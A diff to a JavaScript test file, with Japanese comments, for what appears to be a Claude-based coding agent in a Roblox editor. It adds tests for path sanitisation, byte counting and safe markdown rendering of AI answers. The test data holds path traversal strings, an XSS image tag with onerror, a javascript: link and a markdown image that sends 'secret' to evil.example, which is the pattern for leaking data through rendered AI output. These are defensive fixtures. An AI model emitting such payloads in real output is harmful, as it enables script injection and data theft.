@@ -1,6 +1,7 @@
 // Claude エージェントの部品 (置き換え・差分・API 検索・候補の整形・JSON 読み取り):  node tests/agent.test.mjs
 import { readFileSync } from 'node:fs'
-import { applyReplace, lineDiff, minimalChange, numbered, lookupApi } from '../js/app/agent.js'
+import { applyReplace, lineDiff, minimalChange, numbered, lookupApi, cleanPath, byteLen } from '../js/app/agent.js'
+import { renderMarkdown } from '../js/app/markdown.js'
 import { cleanSuggestion } from '../js/editor/ai.js'
 import { parseJsonLoose } from '../js/app/claude.js'
 import { setRobloxApi } from '../js/editor/apidb.js'
@@ -72,6 +73,20 @@ eq('json plain', parseJsonLoose('{"a":1}'), { a: 1 })
 eq('json fence', parseJsonLoose('Here:\n```json\n{"edits":[]}\n```'), { edits: [] })
 eq('json embedded', parseJsonLoose('結果: {"x": [1, 2]} です'), { x: [1, 2] })
 throws('json bad', () => parseJsonLoose('no json'), /読み取れません/)
+
+// ---- 安全: パス・送信サイズ・AI の回答の表示 ----
+eq('path normal', cleanPath('./src/main.lua'), 'src/main.lua')
+eq('path leading slash', cleanPath('/a/b.lua'), 'a/b.lua')
+throws('path dotdot', () => cleanPath('../secret'), /Invalid path/)
+throws('path dotdot middle', () => cleanPath('a/../../b'), /Invalid path/)
+throws('path empty', () => cleanPath('  '), /Invalid path/)
+throws('path control char', () => cleanPath('a\u0000b'), /Invalid path/)
+eq('bytes ascii', byteLen('abc'), 3)
+eq('bytes japanese', byteLen('日本'), 6)
+const md = renderMarkdown('![x](https://evil.example/?d=secret) <img src=x onerror=alert(1)> [a](javascript:alert(1))', { images: false })
+eq('ai md no img tag', /<img/i.test(md), false)
+eq('ai md no js link', /javascript:/i.test(md.replace(/&[a-z#0-9]+;/g, '')) && /href="javascript/i.test(md), false)
+eq('preview md keeps images', /<img/.test(renderMarkdown('![x](https://e.example/a.png)')), true)
 
 console.log(`agent: ${pass} passed, ${fail} failed`)
 // (読み込んだモジュールが BroadcastChannel を開いたままにするので、明示的に終了する)
